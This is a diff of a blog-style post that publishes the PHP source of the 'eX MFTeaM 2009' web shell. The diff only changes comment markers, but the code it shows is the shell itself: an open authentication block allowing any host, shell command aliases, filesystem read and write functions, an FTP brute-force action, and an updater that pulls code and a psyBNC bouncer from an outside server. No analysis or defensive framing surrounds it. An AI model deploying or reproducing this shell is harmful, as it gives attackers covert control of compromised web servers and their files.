@@ -13,18 +13,18 @@ tags:
 ---
 eX MFTeaM 2009 shell by By FakoMast3r, CopyRight MFTeaM.
 
-## eX MFTeaM 2009 shell Source Code
+### eX MFTeaM 2009 shell Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php
-#######################################
-## eX MFTeaM 2009                    ##
-define('sh_ver'," By FakoMast3r");           ##
-##    CopyRight MFTeaM               ##
-##     irc.midnightcr3w.com           ##
-##    chan #midnightcr3w                       ##
-#######################################
-$sh_name = sh_name();                ##
-#######################################
+##########################################################
+### eX MFTeaM 2009                    ###
+define('sh_ver'," By FakoMast3r");           ###
+###    CopyRight MFTeaM               ###
+###     irc.midnightcr3w.com           ###
+###    chan #midnightcr3w                       ###
+##########################################################
+$sh_name = sh_name();                ###
+##########################################################
 #$sh_mainurl        = "http://www.jemcknight.plus.com/";
 $sh_mainurl        = "http://www.jemcknight.plus.com/";
 $exsh_updateurl  = $sh_mainurl."exsh_update.php";
@@ -35,7 +35,7 @@ $sh_sourcez = array(
   "exSh"   =&gt; array($sh_mainurl."exsh.txt"),
   "psyBNC"   =&gt; array($sh_mainurl."psy.tar.gz"),
 );
-##[ AUTHENTICATION ]##
+###[ AUTHENTICATION ]###
 $auth = array(
   "login"     =&gt; "",
   "pass"      =&gt; "",
@@ -43,7 +43,7 @@ $auth = array(
   "hostallow" =&gt; array("*"),
   "denied"    =&gt; "&lt;a href=\"$sh_mainurl\"&gt;".$sh_name."&lt;/a&gt;: access denied!",
 );
-##[ END AUTHENTICATION ]##
+###[ END AUTHENTICATION ]###
 $curdir = "./";
 $tmpdir = "";
 $tmpdir_logs = "./";
@@ -62,7 +62,7 @@ $hexdump_rows = 24;
 $millink = milw0rm();
 $win = strtolower(substr(PHP_OS,0,3)) == "win";
 $disablefunc = getdisfunc();
-##[ END OF CONFIGS ]##
+###[ END OF CONFIGS ]###
 error_reporting(E_ERROR | E_PARSE);
 @ini_set("max_execution_time",0);
 @set_time_limit(0); #No Fx in SafeMode
@@ -91,7 +91,7 @@ if (empty($surl)) {
   $surl = "?".$includestr;
   $surl = htmlspecialchars($surl);
 }
-## FILE TYPES ##
+### FILE TYPES ###
 $ftypes  = array(
   "html"     =&gt; array("html","htm","shtml"),
   "txt"      =&gt; array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
@@ -129,7 +129,7 @@ $regxp_highlight  = array(
   array("\.html$",1,"&lt;font color=#00CCFF&gt;","&lt;/font&gt;"),
   array("\.txt$",1,"&lt;font color=#C0C0C0&gt;","&lt;/font&gt;")
 );
-## QUICK COMMANDS ##
+### QUICK COMMANDS ###
 if (!$win) {
   $cmdaliases = array(
     array("", "ls -al"),
@@ -193,7 +193,7 @@ else {
     array("Show computers", "net view"),
   );
 }
-## PHP FILESYSTEM TRICKS (By eX) ##
+### PHP FILESYSTEM TRICKS (By eX) ###
 $phpfsaliases = array(
     array("Read File", "read", 1, "File", ""),
     array("Write File (PHP5)", "write", 2, "File","Text"),
@@ -207,7 +207,7 @@ $phpfsaliases = array(
     array("Find Writable Dir", "fwritabledir", 2 ,"Dir"),
     array("Find Pathname Pattern", "glob",2 ,"Dir", "Pattern"),
 );
-## QUICK LAUNCH ##
+### QUICK LAUNCH ###
 $quicklaunch1 = array(
     array("&lt;img src=\"".$surl."act=img&img=home\" alt=\"Home\" border=\"0\"&gt;",$surl),
     array("&lt;img src=\"".$surl."act=img&img=back\" alt=\"Back\" border=\"0\"&gt;","#\" onclick=\"history.back(1)"),
@@ -234,7 +234,7 @@ $quicklaunch2 = array(
 if (!$win) {
   $quicklaunch2[] = array("&lt;br&gt;FTP-Brute",$surl."act=ftpquickbrute&d=%d");
 }
-## HIGHLIGHT CODE ##
+### HIGHLIGHT CODE ###
 $highlight_background = "#C0C0C0";
 $highlight_bg = "#FFFFFF";
 $highlight_comment = "#6A6A6A";
@@ -242,9 +242,9 @@ $highlight_default = "#0000BB";
 $highlight_html = "#1300FF";
 $highlight_keyword = "#007700";
 $highlight_string = "#000000";
-####################
-##[ AUTHENTICATE ]##
-####################
+##############################
+###[ AUTHENTICATE ]###
+##############################
 $tmp = array();
 foreach ($auth["hostallow"] as $k =&gt; $v) {
   $tmp[] = str_replace("\\*",".*",preg_quote($v));
@@ -261,7 +261,7 @@ if (!empty($auth["login"])) {
     die($auth["denied"]);
   }
 }
-## END AUTHENTICATE ##
+### END AUTHENTICATE ###
 
 if ($act != "img") {
   $lastdir = realpath(".");
@@ -446,7 +446,7 @@ if ($act != "img") {
     if (is_dir($f)) { $act = "ls"; $d = $f; }
     else { $act = "f"; $d = dirname($f); $f = basename($f); }
   }
-  ## HEADERS ##
+  ### HEADERS ###
   @ob_start();
   @ob_implicit_flush(0);
   header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
@@ -501,9 +501,9 @@ if ($act != "img") {
     $hopenbasedir = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";
   }
   
-##################
-##[ HTML START ]##
-##################
+###########################
+###[ HTML START ]###
+###########################
 function srv_info($title,$contents) {
   echo "&lt;tr&gt;&lt;th&gt;$title&lt;/th&gt;&lt;td&gt;:&lt;/td&gt;&lt;td&gt;$contents&lt;/td&gt;&lt;/tr&gt;\n";
 }
@@ -1753,7 +1753,7 @@ if ($act == "ls") {
   }
 }
 if ($act == "tools") { tools(); }
-##[ PHP FILESYSTEM TRICKZ (By eX) ]##
+###[ PHP FILESYSTEM TRICKZ (By eX) ]###
 if ($act == "phpfsys") { 
   echo "&lt;div align=left&gt;";
   $fsfunc = $phpfsysfunc;
@@ -2603,7 +2603,7 @@ echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n";
 &lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;PHP Filesystem:&lt;/td&gt;
 &lt;td&gt;
-&lt;?php ##[ eX TriCkz ]## ?&gt;
+&lt;?php ###[ eX TriCkz ]### ?&gt;
 &lt;script language="javascript"&gt;
 function set_arg(txt1,txt2) {
   document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";
@@ -2668,9 +2668,9 @@ function chg_arg(num,txt1,txt2) {
 &lt;/body&gt;&lt;/html&gt;
 &lt;?php
 
-###########################
-## exSh CORE FUNCTIONS ##
-###########################
+########################################
+### exSh CORE FUNCTIONS ###
+########################################
 function safemode() {
   if ( @ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) { return TRUE; }
   else { return FALSE; }
@@ -2790,7 +2790,7 @@ function disp_freespace($curdrv) {
   $total = view_size($total);
   return "$free of $total ($free_percent)";
 }
-## exSh UPDATE FUNCTIONS ##
+### exSh UPDATE FUNCTIONS ###
 function exgetsource($fn) {
   global $exsh_sourcesurl;
   $array = array(
@@ -2855,8 +2855,8 @@ function ex_sess_put($data) {
   $data = serialize($data);
   setcookie($sess_cookie,$data);
 }
-## END exSh UPDATE FUNCTIONS ##
-## FILESYSTEM FUNCTIONS ##
+### END exSh UPDATE FUNCTIONS ###
+### FILESYSTEM FUNCTIONS ###
 function fs_copy_dir($d,$t) {
   $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
   if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
@@ -2932,7 +2932,7 @@ function fs_rmobj($o) {
   elseif (is_file($o)) {return unlink($o);}
   else {return FALSE;}
 }
-## END FILESYSTEM FUNCTIONS ##
+### END FILESYSTEM FUNCTIONS ###
 function onphpshutdown() {
   global $gzipencode,$ft;
   if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {
